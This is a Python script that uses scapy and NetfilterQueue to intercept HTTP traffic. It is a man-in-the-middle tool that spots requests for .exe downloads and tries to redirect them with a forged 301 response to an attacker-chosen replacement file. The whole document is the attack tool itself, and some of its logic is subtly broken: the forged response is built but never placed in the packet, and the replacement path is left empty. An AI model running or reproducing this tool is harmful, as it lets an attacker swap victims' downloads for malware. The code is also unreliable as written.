#!/usr/bin/python3

import scapy.all as scapy
from netfilterqueue import NetfilterQueue

def processing_interceptor(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    load = scapy_packet[scapy.Raw].load.decode('latin1')
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in load and replace_file.split('/')[2] not in load:
                print("[found exe request...]")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                load = "HTTP/1.1 301 Moved Permanently\nLocation: " + replace_file + "\n\n"

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum

                packet.set_payload(bytes(scapy_packet))
                print("[Senidng Http Response with replaced file...]")

    packet.accept()

ack_list = []
replace_file = ""
try:
    queue = NetfilterQueue()
    queue.bind(0, processing_interceptor)
    queue.run()
except KeyboardInterrupt:
    print("Quitting program")